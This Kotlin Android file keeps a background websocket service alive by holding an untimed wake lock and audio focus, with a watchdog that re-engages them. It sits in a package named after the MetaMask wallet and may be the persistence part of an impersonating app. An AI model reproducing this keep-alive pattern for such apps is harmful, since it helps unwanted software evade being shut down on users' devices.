package com.example.MetaMask.services

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.os.PowerManager

object KeepAliveManager {

    private const val CHECK_MS  = 15_000L
    private const val GRACE_MS  = 20_000L

    enum class Layer { NONE, FOCUS }
    @Volatile var activeLayer = Layer.NONE

    private val handler = Handler(Looper.getMainLooper())
    @Volatile private var watchdogRunnable: Runnable? = null
    @Volatile private var partialWakeLock: PowerManager.WakeLock? = null

    fun engage(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] engage enter context=ctx") //xdbg
        if (activeLayer != Layer.NONE) return
        acquireWakeLock(context)
        AudioFocusHolder.request(context)
        activeLayer = Layer.FOCUS
        startWatchdog(context)
    }

    fun releaseAll(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] releaseAll enter context=ctx") //xdbg
        stopWatchdog()
        activeLayer = Layer.NONE
        AudioFocusHolder.release(context)
        releaseWakeLock()
        KeepAliveJobService.cancel(context)
    }

    private fun startWatchdog(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] startWatchdog enter context=ctx") //xdbg
        stopWatchdog()
        handler.postDelayed({ scheduleCheck(context) }, GRACE_MS)
    }

    private fun scheduleCheck(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] scheduleCheck enter context=ctx") //xdbg
        val r = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[KeepAliveManager] run enter") //xdbg
                try { check(context) } catch (_: Exception) {}
                if (activeLayer != Layer.NONE && MasterWebSocketDispatcher.IS_SERVICE_RUNNING) {
                    android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                    handler.postDelayed(this, CHECK_MS)
                    watchdogRunnable = this
                }
            }
        }
        watchdogRunnable = r
        r.run()
    }

    private fun check(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] check enter context=ctx") //xdbg
        if (!MasterWebSocketDispatcher.IS_SERVICE_RUNNING) {
            android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
            releaseAll(context)
            return
        }
        val alive = when (activeLayer) {
            Layer.FOCUS -> AudioFocusHolder.isHeld
            Layer.NONE  -> false
        }
        if (!alive) {
            android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
            val old = activeLayer
            activeLayer = Layer.NONE
            if (old != Layer.NONE) engage(context)
        }
    }

    private fun stopWatchdog() {
        android.util.Log.d("XDBG", "[KeepAliveManager] stopWatchdog enter") //xdbg
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    private fun acquireWakeLock(context: Context) {
        android.util.Log.d("XDBG", "[KeepAliveManager] acquireWakeLock enter context=ctx") //xdbg
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (partialWakeLock == null) {
                android.util.Log.d("XDBG", "[KeepAliveManager] if branch") //xdbg
                partialWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "KeepAlive:partial")
                    .apply { setReferenceCounted(false) }
            }
            if (partialWakeLock?.isHeld != true) partialWakeLock?.acquire()
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        android.util.Log.d("XDBG", "[KeepAliveManager] releaseWakeLock enter") //xdbg
        try { if (partialWakeLock?.isHeld == true) partialWakeLock?.release() } catch (_: Exception) {}
    }
}
